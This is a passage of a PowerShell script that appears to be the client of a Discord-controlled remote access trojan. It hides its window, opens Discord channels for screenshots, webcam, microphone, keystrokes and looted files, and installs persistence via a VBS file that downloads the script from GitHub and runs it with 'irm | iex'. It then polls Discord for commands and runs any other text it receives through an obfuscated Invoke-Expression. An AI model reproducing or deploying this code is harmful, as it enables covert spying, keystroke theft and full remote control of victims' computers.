    $adminperm = "True"
}

if ($InfoOnConnect -eq '1'){
    $infocall = ':hourglass: Getting system info - please wait.. :hourglass:'
}
else{
    $infocall = 'Type `` Options `` in chat for commands list'
}

$script:jsonPayload = @{
    username   = $env:COMPUTERNAME
    tts        = $false
    embeds     = @(
        @{
            title       = "$env:COMPUTERNAME | C2 session started!"
            "description" = @"
Session Started  : ``$timestamp``

$infocall
"@
            color       = 65280
        }
    )
}
sendMsg -Embed $jsonPayload

    if ($InfoOnConnect -eq '1'){
 	    quickInfo
    }
    else{}
}

# ------------------------  FUNCTION CALLS + SETUP  ---------------------------
# Hide the console
If ($hideconsole -eq 1){ 
    HideWindow
}
Function Get-BotUserId {
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)
    $botInfo = $wc.DownloadString("https://discord.com/api/v10/users/@me")
    $botInfo = $botInfo | ConvertFrom-Json
    return $botInfo.id
}
$global:botId = Get-BotUserId
# Create category and new channels
NewChannelCategory
sleep 1
NewChannel -name 'session-control'
$global:SessionID = $ChannelID
$global:ch = $ChannelID
sleep 1
NewChannel -name 'screenshots'
$global:ScreenshotID = $ChannelID
sleep 1
NewChannel -name 'webcam'
$global:WebcamID = $ChannelID
sleep 1
NewChannel -name 'microphone'
$global:MicrophoneID = $ChannelID
sleep 1
NewChannel -name 'keycapture'
$global:keyID = $ChannelID
sleep 1
NewChannel -name 'loot-files'
$global:LootID = $ChannelID
sleep 1
NewChannel -name 'powershell'
$global:PowershellID = $ChannelID
sleep 1
# Download ffmpeg to temp folder
$Path = "$env:Temp\ffmpeg.exe"
If (!(Test-Path $Path)){  
    GetFfmpeg
}
# Opening info message
ConnectMsg
# Start all functions upon running the script
If ($defaultstart -eq 1){ 
    StartAll
}
# Send setup complete message to discord
sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Setup Complete!`` :white_check_mark:"

# ---------------------------------------------------------------------------------------------------------------------------------------------------------

Function CloseMsg {
$script:jsonPayload = @{
    username   = $env:COMPUTERNAME
    tts        = $false
    embeds     = @(
        @{
            title       = " $env:COMPUTERNAME | Session Closed "
            "description" = @"
:no_entry: **$env:COMPUTERNAME** Closing session :no_entry:     
"@
            color       = 16711680
            footer      = @{
                text = "$timestamp"
            }
        }
    )
}
sendMsg -Embed $jsonPayload
}

Function VersionCheck {
    $versionCheck = irm -Uri "https://pastebin.com/raw/3axupAKL"
    $VBpath = "C:\Windows\Tasks\service.vbs"
    if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"){
    Write-Output "Persistance Installed - Checking Version.."
        if (!($version -match $versionCheck)){
            Write-Output "Newer version available! Downloading and Restarting"
            RemovePersistance
            AddPersistance
            $tobat = @"
Set WshShell = WScript.CreateObject(`"WScript.Shell`")
WScript.Sleep 200
WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
"@
            $tobat | Out-File -FilePath $VBpath -Force
            sleep 1
            & $VBpath
            exit
        }
    }
}

# =============================================================== MAIN LOOP =========================================================================

VersionCheck

while ($true) {

    $headers = @{
        'Authorization' = "Bot $token"
    }
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)
    $messages = $wc.DownloadString("https://discord.com/api/v10/channels/$SessionID/messages")
    $most_recent_message = ($messages | ConvertFrom-Json)[0]
    if ($most_recent_message.author.id -ne $botId) {
        $latestMessageId = $most_recent_message.timestamp
        $messages = $most_recent_message.content
    }
    if ($latestMessageId -ne $lastMessageId) {
        $lastMessageId = $latestMessageId
        $global:latestMessageContent = $messages
        $camrunning = Get-Job -Name Webcam
        $sceenrunning = Get-Job -Name Screen
        $audiorunning = Get-Job -Name Audio
        $PSrunning = Get-Job -Name PSconsole
        $lootrunning = Get-Job -Name Info
        $keysrunning = Get-Job -Name Keys
        if ($messages -eq 'webcam'){
            if (!($camrunning)){
                Start-Job -ScriptBlock $camJob -Name Webcam -ArgumentList $global:token, $global:WebcamID
                sendMsg -Message ":camera: ``$env:COMPUTERNAME Webcam Session Started!`` :camera:"
            }
            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
        }
        if ($messages -eq 'screenshots'){
            if (!($sceenrunning)){
                Start-Job -ScriptBlock $screenJob -Name Screen -ArgumentList $global:token, $global:ScreenshotID
                sendMsg -Message ":desktop: ``$env:COMPUTERNAME Screenshot Session Started!`` :desktop:"
            }
            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
        }
        if ($messages -eq 'psconsole'){
            if (!($PSrunning)){
                Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID
                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME PS Session Started!`` :white_check_mark:"
            }
            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
        }
        if ($messages -eq 'microphone'){
            if (!($audiorunning)){
                Start-Job -ScriptBlock $audioJob -Name Audio -ArgumentList $global:token, $global:MicrophoneID
                sendMsg -Message ":microphone2: ``$env:COMPUTERNAME Microphone Session Started!`` :microphone2:"
            }
            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
        }
        if ($messages -eq 'keycapture'){
            if (!($keysrunning)){
                Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID
                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Keycapture Session Started!`` :white_check_mark:"
            }
            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
        }
        if ($messages -eq 'systeminfo'){
            if (!($lootrunning)){
                Start-Job -ScriptBlock $dolootjob -Name Info -ArgumentList $global:token, $global:LootID
                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Gathering System Info!`` :white_check_mark:"
            }
            else{sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:"}
        }
        if ($messages -eq 'pausejobs'){
            Stop-Job -Name Audio
            Stop-Job -Name Screen
            Stop-Job -Name Webcam
            Stop-Job -Name PSconsole
            Stop-Job -Name Keys
            Remove-Job -Name Audio
            Remove-Job -Name Screen
            Remove-Job -Name Webcam
            Remove-Job -Name PSconsole
            Remove-Job -Name Keys
            sendMsg -Message ":no_entry: ``Stopped All Jobs! : $env:COMPUTERNAME`` :no_entry:"   
        }
        if ($messages -eq 'close'){
            CloseMsg
            sleep 2
            exit      
        }
        else{&($env:CommonProgramW6432[12],$env:ComSpec[15],$env:ComSpec[25] -Join $())($messages) -ErrorAction Stop}
    }
    Sleep 3
}
